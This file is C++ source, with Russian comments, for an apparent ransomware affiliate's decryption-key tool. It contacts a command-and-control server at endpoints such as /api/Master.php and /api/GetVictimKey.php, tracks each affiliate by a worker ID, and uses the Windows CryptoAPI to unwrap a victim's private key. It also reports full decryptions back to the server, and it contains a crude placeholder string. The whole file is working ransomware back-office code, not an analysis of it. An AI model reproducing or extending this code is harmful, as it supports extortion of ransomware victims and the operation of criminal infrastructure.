// TODO: main::44 = Implement reading from entry if key wasn't found.
#define _CRT_SECURE_NO_WARNINGS
#include "../Api.h"
#include "resource.h"
HWND Dialog;

#define BAD_RESPONSE "I fucked your mom"

Keygen_Data* data = NULL;


char* getMasterKey()
{
	HINTERNET hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
	// 443 - https, 80 - http
	HINTERNET hConnect = InternetConnect(hInternet, Strs::server, (HTTPS == 1) ? 443 : 80, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
	char *requestPage = (char*)Mem::Alloc(512);
	// создаю строку запроса
	data->worker_id[8] = 0;
	wsprintf(requestPage, "vector=%s&email=%s", data->worker_id, data->email);
	// отправляю запрос, учитывая http(s)
	HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/api/Master.php", NULL, NULL, NULL,
		(HTTPS == 1) ? INTERNET_FLAG_SECURE : INTERNET_FLAG_KEEP_CONNECTION, 0);
	HttpSendRequestA(hRequest, Strs::content_type, lstrlen(Strs::content_type), requestPage, lstrlen(requestPage));
	// Получаю ответ от сервера
	char *response = (char*)Mem::Alloc(10000);
	DWORD sent;
	InternetReadFile(hRequest, response, 10000, &sent);
	response[sent] = 0;
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	Dbg::print("Sent master key request. Request = %s\n", requestPage);
	Mem::Free(requestPage);
	// Если на сервере нет ключа, то берём его из файла
	if (!lstrcmp((LPSTR)response, BAD_RESPONSE))
	{
		Mem::Zero(response, 10000);
		char fileName[50];
		wsprintf(fileName, "%s_privateKey.txt", data->worker_id);
		HANDLE hKeyFile = CreateFile(fileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hKeyFile != INVALID_HANDLE_VALUE)
		{

			CloseHandle(hKeyFile);
		}
	}


	return response;
}

char* getPrivateKey_id()
{
	HINTERNET hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
	HINTERNET hConnect = InternetConnect(hInternet, Strs::server, (HTTPS == 1) ? 443 : 80, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
	char requestPage[512], id[50];
	GetDlgItemText(Dialog, IDC_EDIT3, id, sizeof(id));
	wsprintf(requestPage, "v1=%s&v2=%s", id, data->worker_id);
	HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/api/GetVictimKey.php", NULL, NULL, NULL,
		(HTTPS == 1) ? INTERNET_FLAG_SECURE : INTERNET_FLAG_KEEP_CONNECTION, 0);
	HttpSendRequest(hRequest, Strs::content_type, lstrlen(Strs::content_type), requestPage, lstrlen(requestPage));
	char *response = (char*)Mem::Alloc(10000);
	DWORD sent;
	InternetReadFile(hRequest, response, 10000, &sent);
	response[sent] = 0;
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	Dbg::print("Sent user key request. Request = %s\n", requestPage);
	if (!lstrcmp(response, BAD_RESPONSE))
		MessageBoxA(0, "Decryption key wasn't found.", 0, 0);
	else
	{
		 Dbg::print("Decryption key found\n");
	}
	return response;
}


BYTE* getPrivateKey()
{
	BYTE* encBase64 = NULL;
	char* masterBase64 = getMasterKey();
	int masterKeyLen;
	BYTE* masterKey = (byte*)Crypt::base64_decode(masterBase64, lstrlen(masterBase64), &masterKeyLen);
	Mem::Free(masterBase64);
	HCRYPTPROV prov;
	HCRYPTKEY masterPriv;
	if (CryptAcquireContextA(&prov, NULL, 0, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
	{
		if (CryptImportKey(prov, masterKey, masterKeyLen, 0, CRYPT_EXPORTABLE, &masterPriv))
		{
			Dbg::print("getPrivateKey: private masterKey imported.\n");
			char* userPrivBase64 = getPrivateKey_id();

			// Получаем начало разделителя
			char *normalData = StrStrA(userPrivBase64, Strs::delimiter);
			BYTE cipheredData[512], res[5120];
			DWORD cipherLen, resLen;
			// Копируем зашифрованные байты и расшифровываем их.
			char *firstCiph = Crypt::base64_decode(userPrivBase64, normalData - userPrivBase64, (int*)&cipherLen);
			Mem::Copy(cipheredData, firstCiph, cipherLen);
			if (CryptDecrypt(masterPriv, NULL, TRUE, 0, cipheredData, &cipherLen))
				 Dbg::print("Key decrypted\n");
			else
				 Dbg::print("CryptDecrypt error = %d\n", Utils::getLastError());
			// Копируем расшифрованные 245 байт. Смотри в Ransomware::Main::dropkey().
			Mem::Copy(res, cipheredData, 245);
			// Получаю оставшиеся данные и копирую их в буфер.
			char *secondData = Crypt::base64_decode(normalData + 9, lstrlen(normalData + 9), (int*)&resLen);
			Mem::Copy(&res[245], secondData, resLen);

			Mem::Free(secondData);
			Mem::Free(firstCiph);

			encBase64 = (BYTE*)Crypt::base64_encode(res, resLen + 245);

			CryptDestroyKey(masterPriv);
		}
		else
		{
			 Dbg::print("CryptImportKey failed. Error = %d\n", Utils::getLastError());
		}
		CryptReleaseContext(prov, 0);
	}
	return encBase64;
}

void SendDecrypt()
{
	HINTERNET hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET hConnect = InternetConnect(hInternet, Strs::server, (HTTPS == 1) ? 443 : 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	char request[500], victim_id[30];
	GetDlgItemText(Dialog, IDC_EDIT3, victim_id, 30);
	wsprintf(request, "v1=%s&v2=%s", victim_id, data->worker_id);
	HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/api/Decrypted.php", NULL, NULL, NULL,
		(HTTPS == 1) ? INTERNET_FLAG_SECURE : INTERNET_FLAG_KEEP_CONNECTION, 0);
	HttpSendRequest(hRequest, Strs::content_type, lstrlen(Strs::content_type), request, lstrlen(request));
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	Dbg::print("SendDecrypt: request done. Request = %s\n", request);
}


INT_PTR CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uMsg)
	{
	case WM_CLOSE:
		ExitProcess(0);
		break;
	case WM_COMMAND:
		switch (wParam)
		{
		case IDCANCEL:
			ExitProcess(0);
			break;
		case IDC_BUTTON1:
		{
			// проверяем, один файл был выбран или полный декрипт 
			int isOneFile = SendDlgItemMessage(Dialog, IDC_CHECK1, BM_GETCHECK, 0, 0);
			if (!isOneFile)
			{
				 Dbg::print("The worker choosed full decrypt. Sending info to server...\n");
				 SendDecrypt();
			}
			BYTE* privateKey = getPrivateKey();
			SetDlgItemText(Dialog, IDC_EDIT1, (LPSTR)privateKey);
			break;
		}
		}
	}
	return FALSE;
}


void Entry()
{
	InitApi();
	
	// Инициализация консоли, нужно для отладки
	// AllocConsole();

	data = (Keygen_Data*)Utils::ReadInfo();
	MSG uMsg;
	Dialog = CreateDialogParam(0, MAKEINTRESOURCE(IDD_DIALOG1), HWND_DESKTOP, DialogProc, 0);
	ShowWindow(Dialog, SW_SHOWNORMAL);
	// цикл обработки событий
	while (GetMessage(&uMsg, 0, 0, 0))
	{
		 if (!IsDialogMessage(Dialog, &uMsg))
		 {
			  TranslateMessage(&uMsg);
			  DispatchMessage(&uMsg);
		 }
		 else if ((GetKeyState(VK_CONTROL) & 0x8000) && uMsg.wParam == 'A')
		 {
			  SendMessage(GetFocus(), EM_SETSEL, 0, -1);
		 }
	}
	ExitProcess(0);
}
